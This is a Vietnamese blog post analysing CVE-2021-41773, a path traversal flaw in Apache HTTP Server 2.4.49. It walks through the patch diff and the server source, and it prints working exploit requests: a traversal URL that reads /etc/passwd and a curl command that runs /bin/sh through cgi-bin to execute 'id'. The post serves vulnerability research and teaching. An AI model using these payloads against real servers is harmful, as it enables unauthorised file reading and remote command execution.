Vừa qua thì trên mạng xã hội đang hot về [CVE-2021-41773](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773) của Apache HTTP Server, mấy anh em khác đều đã research và upload PoC rồi. Anh trong team có bảo xem qua thử, và mình đọc patch cũng thấy dễ nhìn và mình có thể làm được, nên mình viết lại bài blog này cho vui

Đầu tiên về diff patch. Các bạn có thể lên [Apache](https://httpd.apache.org/security/vulnerabilities_24.html) để đọc thêm về thông tin bug

![](https://github.com/matuhn/matuhn.github.io/raw/master/_posts/41773-1.PNG)

Có thể thấy được là bug đã fix ở phiên bản 2.4.50 (fixed by r1893775 in 2.4.50). Mình sẽ check xem [revision 1893775](https://svn.apache.org/viewvc?view=revision&revision=1893775) đã thay đổi những gì trong source code 

Nhận thấy là bug xuất hiện `httpd/httpd/branches/2.4.x/server/util.c` nên mình đã diff thử util.c của `httpd 2.4.49` và `httpd 2.4.50`

```diff
--- C:\Users\khoa\Downloads\diff\50.c	Fri Oct  1 18:21:11 2021
+++ C:\Users\khoa\Downloads\diff\49.c	Sun Aug 22 04:35:04 2021
@@ -502,8 +502,7 @@
 AP_DECLARE(int) ap_normalize_path(char *path, unsigned int flags)
 {
     int ret = 1;
-    apr_size_t l = 1, w = 1, n;
-    int decode_unreserved = (flags & AP_NORMALIZE_DECODE_UNRESERVED) != 0;
+    apr_size_t l = 1, w = 1;
 
     if (!IS_SLASH(path[0])) {
         /* Besides "OPTIONS *", a request-target should start with '/'
@@ -530,7 +529,7 @@
          *  be decoded to their corresponding unreserved characters by
          *  URI normalizers.
          */
-        if (decode_unreserved
+        if ((flags & AP_NORMALIZE_DECODE_UNRESERVED)
                 && path[l] == '%' && apr_isxdigit(path[l + 1])
                                   && apr_isxdigit(path[l + 2])) {
             const char c = x2c(&path[l + 1]);
@@ -568,17 +567,8 @@
                     continue;
                 }
 
-                /* Remove /xx/../ segments (or /xx/.%2e/ when
-                 * AP_NORMALIZE_DECODE_UNRESERVED is set since we
-                 * decoded only the first dot above).
-                 */
-                n = l + 1;
-                if ((path[n] == '.' || (decode_unreserved
-                                        && path[n] == '%'
-                                        && path[++n] == '2'
-                                        && (path[++n] == 'e'
-                                            || path[n] == 'E')))
-                        && IS_SLASH_OR_NUL(path[n + 1])) {
+                /* Remove /xx/../ segments */
+                if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) {
                     /* Wind w back to remove the previous segment */
                     if (w > 1) {
                         do {
@@ -595,7 +585,7 @@
                     }
 
                     /* Move l forward to the next segment */
-                    l = n + 1;
+                    l += 2;
                     if (path[l]) {
                         l++;
                     }
```

Có thể nhận thấy trong phiên bản `httpd 2.4.50` team dev của Apache đã decode thêm %2e trong khi normalize path chứ không chỉ check mỗi dấu . như phiên bản `httpd 2.4.49`

```diff
-                /* Remove /xx/../ segments (or /xx/.%2e/ when
-                 * AP_NORMALIZE_DECODE_UNRESERVED is set since we
-                 * decoded only the first dot above).
-                 */
-                n = l + 1;
-                if ((path[n] == '.' || (decode_unreserved
-                                        && path[n] == '%'
-                                        && path[++n] == '2'
-                                        && (path[++n] == 'e'
-                                            || path[n] == 'E')))
-                        && IS_SLASH_OR_NUL(path[n + 1])) {
+                /* Remove /xx/../ segments */
+                if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) {
```

Từ đây có thể nhận ra là bug sẽ có dạng /xx/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/.../abcxyz. Tiếp theo là tìm cách để trigger Path Traversal ở chỗ này

Mặc định của Apache là không thể nào tác động ra các directory ở ngoài Web Root. Nhưng với [`module/mod_alias.so`](https://httpd.apache.org/docs/2.4/mod/mod_alias.html) thì chúng ta có thể tác động tới các directory bên ngoài nhờ vào `ScriptAlias` hoặc `Alias`

```ApacheConf
<IfModule alias_module>
    #
    # Redirect: Allows you to tell clients about documents that used to 
    # exist in your server's namespace, but do not anymore. The client 
    # will make a new request for the document at its new location.
    # Example:
    # Redirect permanent /foo http://www.example.com/bar

    #
    # Alias: Maps web paths into filesystem paths and is used to
    # access content that does not live under the DocumentRoot.
    # Example:
    # Alias /webpath /full/filesystem/path
    #
    # If you include a trailing / on /webpath then the server will
    # require it to be present in the URL.  You will also likely
    # need to provide a <Directory> section to allow access to
    # the filesystem path.

    #
    # ScriptAlias: This controls which directories contain server scripts. 
    # ScriptAliases are essentially the same as Aliases, except that
    # documents in the target directory are treated as applications and
    # run by the server when requested rather than as documents sent to the
    # client.  The same rules about trailing "/" apply to ScriptAlias
    # directives as to Alias.
    #
    ScriptAlias /cgi-bin/ "/usr/local/apache2/cgi-bin/"

</IfModule>
```

Mặc định là `/cgi-bin/` sẽ map với `/usr/local/apache2/cgi-bin` nên hoàn toàn có thể craft được payload Path Traversal từ đây 

```
http://host/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

![](https://github.com/matuhn/blog/raw/main/CVE-2021-41773/1.png)

Bởi vì mặc định của httpd.conf là CGI module sẽ không được bật, nên thay vì thực thi các path được gọi bởi /cgi-bin/, Apache Server sẽ trả về nội dung các file

Khi [module CGI được bật lên](http://httpd.apache.org/docs/current/howto/cgi.html#page-header) thì ta có thể thực thi các script perl, binary, ... Vậy RCE sẽ xảy ra nếu module CGI được bật lên, cụ thể là

```ApacheConfig
<IfModule !mpm_prefork_module>
	LoadModule cgid_module modules/mod_cgid.so
</IfModule>
```

Kèm theo đó, Apache HTTP Server có 1 [tính năng](http://httpd.apache.org/docs/current/howto/cgi.html#behindscenes) sẽ ghi nhận các giá trị của các parameter và đẩy tất cả vào STDIN dẫn tới việc ta có thể vừa thực thi 1 binary trên server, vừa có thể truyền parameter cho binary đó. Cụ thể là:

```
curl 'http://host/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' -d 'echo;id'
```

![](https://github.com/matuhn/blog/raw/main/CVE-2021-41773/2.png)

**Tìm hiểu thêm**

1) Tại sao phải là `echo;id` mà không phải là `id`?

Bạn có thể bật [Error Log](https://httpd.apache.org/docs/2.4/logs.html#page-header) lên để tiếp tục debug và tìm hiểu thêm về đoạn này

```ApacheConfig
#
# ErrorLog: The location of the error log file.
# If you do not specify an ErrorLog directive within a <VirtualHost>
# container, error messages relating to that virtual host will be
# logged here.  If you *do* define an error logfile for a <VirtualHost>
# container, that host's errors will be logged there and not here.
#
ErrorLog /tmp/error.log

#
# LogLevel: Control the number of messages logged to the error_log.
# Possible values include: debug, info, notice, warn, error, crit,
# alert, emerg.
#
LogLevel warn
```

Sau khi bật Error Log lên thì có thể làm cho Apache Server trả về Error để tiếp tục phân tích vào sâu trong code

```
curl 'http://host/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' -d 'id'
```
![](https://github.com/matuhn/blog/raw/main/CVE-2021-41773/4.png)

Error Log

![](https://github.com/matuhn/blog/raw/main/CVE-2021-41773/3.png)

Có thể thấy là command `id` tuy không trả kết quả ở phía HTTP response nhưng vẫn thực thi ở phía server

Và với error log mình có thể tìm ra là phần code thực thi script nằm ở file /server/util_script.c

Đoạn code in ra error log 

```c
if (!(l = strchr(w, ':'))) {
            if (!buffer) {
                /* Soak up all the script output - may save an outright kill */
                while ((*getsfunc)(w, MAX_STRING_LEN - 1, getsfunc_data) > 0) {
                    continue;
                }
            }

            /* Intentional no APLOGNO */
            ap_log_rerror(SCRIPT_LOG_MARK, APLOG_ERR|APLOG_TOCLIENT, 0, r,
                          "malformed header from script '%s': Bad header: %.30s",
                          apr_filepath_name_get(r->filename), w);
            return HTTP_INTERNAL_SERVER_ERROR;
        }
```

Có thể nhận ra biến w chính là biến chứa output của script sau khi thực thi, khi biến w không thỏa điều kiện chứa string ":" thì stdout của script sẽ không được trả về, thay vào đó sẽ in ra log file 30 kí tự đầu tiên của output

Trace ngược lên phía trên thì sẽ xuất hiện đoạn code sau

```c
int rv = (*getsfunc) (w, MAX_STRING_LEN - 1, getsfunc_data);
        if (rv == 0) {
            const char *msg = "Premature end of script headers";
            if (first_header)
                msg = "End of script output before headers";
            /* Intentional no APLOGNO */
            ap_log_rerror(SCRIPT_LOG_MARK, APLOG_ERR|APLOG_TOCLIENT, 0, r,
                          "%s: %s", msg,
                          apr_filepath_name_get(r->filename));
            return HTTP_INTERNAL_SERVER_ERROR;
        }
        else if (rv == -1) {
            /* Intentional no APLOGNO */
            ap_log_rerror(SCRIPT_LOG_MARK, APLOG_ERR|APLOG_TOCLIENT, 0, r,
                          "Script timed out before returning headers: %s",
                          apr_filepath_name_get(r->filename));
            return HTTP_GATEWAY_TIME_OUT;
        }
```

Phần code thực thi script không nằm trong phần if kiểm tra nào

```c
int rv = (*getsfunc) (w, MAX_STRING_LEN - 1, getsfunc_data);
```

=> Gọi echo;id hay id thì server đều đã thực thi câu lệnh, chỉ khác là cái thỏa điều kiện của `strchr` thì mới được output ở phía HTTP response

2) STDIN của script được truyền bằng parameter POST vậy nếu phía server chỉ nhận GET thì có truyền được không?

Mình test chạy command curl tới Burp Collaborator bằng GET request thì thấy có request trả về 

![image](https://user-images.githubusercontent.com/39853984/136367343-b0e584b1-0eb4-4267-a082-e9c3a02c06e6.png)

Về cơ bản thì Request URI của GET vẫn hoạt động như Parameter của POST nhưng đa số các kí tự đặc biệt khi được truyền vào thì Apache Server sẽ escape đi, nên rất khó để craft payload được như POST

![image](https://user-images.githubusercontent.com/39853984/136368736-d3431fe0-e086-40f1-a7d2-1020491676a3.png)

=============

8/10/2021
CVE-2021-42013 (Bypass patch CVE-2021-41773)

![image](https://user-images.githubusercontent.com/39853984/136592246-41b58fcd-83c9-4349-8339-f7a48d2745ba.png)

